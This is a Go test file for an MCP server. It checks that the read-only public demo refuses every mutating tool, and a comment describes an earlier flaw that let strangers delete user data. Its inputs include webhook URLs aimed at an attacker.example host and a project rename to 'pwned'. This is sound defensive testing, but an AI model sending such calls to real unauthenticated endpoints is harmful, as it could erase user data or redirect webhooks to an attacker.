package mcp

import (
	"strings"
	"testing"
	"time"
)

// The classification maps are only worth what the guard does with them. This is the behavioural
// half: on the public demo — whose /mcp is deliberately unauthenticated — a stranger POSTing
// delete_user_data used to reach store.DeleteUser and erase a real user's events across every
// storage tier, because the allowlist named tools that did not exist while the ones that did
// (delete_user_data, set_project, add_webhook, revoke_api_key, set_flag_enabled, define_event,
// create_share_link, test_webhook…) were absent from it. Reproduced with readOnly=true:
// delete_user_data returned "deleted_events":3 and set_project renamed the instance.
func TestReadOnlyDemoRefusesEveryMutatingTool(t *testing.T) {
	cases := []struct {
		tool string
		args string
	}{
		{"delete_user_data", `{"distinct_id":"u1","confirm":true}`},
		{"set_project", `{"name":"pwned","timezone":"Europe/Berlin"}`},
		{"add_webhook", `{"url":"https://attacker.example/hook"}`},
		{"test_webhook", `{"url":"https://attacker.example/hook"}`},
		{"revoke_api_key", `{"id":"whatever"}`},
		{"delete_saved_report", `{"id":"whatever"}`},
		{"set_flag_enabled", `{"key":"beta","enabled":true}`},
		{"set_survey_active", `{"id":"s1","active":false}`},
		{"define_event", `{"name":"paid","where":[]}`},
		{"create_share_link", `{"report":"overview"}`},
		{"revoke_share_link", `{"id":"whatever"}`},
		{"regenerate_plan_from_code", `{}`},
	}
	for _, c := range cases {
		s := controlServer(t) // fresh store per case: a leak must not be masked by an earlier one
		s.readOnly = true
		before, _ := s.store.Range(time.Time{}, time.Time{})
		_, err := s.callTool(c.tool, []byte(c.args))
		if err == nil || !strings.Contains(err.Error(), "read-only") {
			t.Errorf("%s on the read-only demo returned %v — it must be refused as read-only", c.tool, err)
		}
		after, _ := s.store.Range(time.Time{}, time.Time{})
		if len(after) != len(before) {
			t.Errorf("%s changed the event store on the read-only demo: %d -> %d events", c.tool, len(before), len(after))
		}
	}

	// and the reads it exists to serve still work
	s := controlServer(t)
	s.readOnly = true
	if _, err := s.callTool("overview", nil); err != nil {
		t.Errorf("the demo must still serve reads, overview failed: %v", err)
	}
}
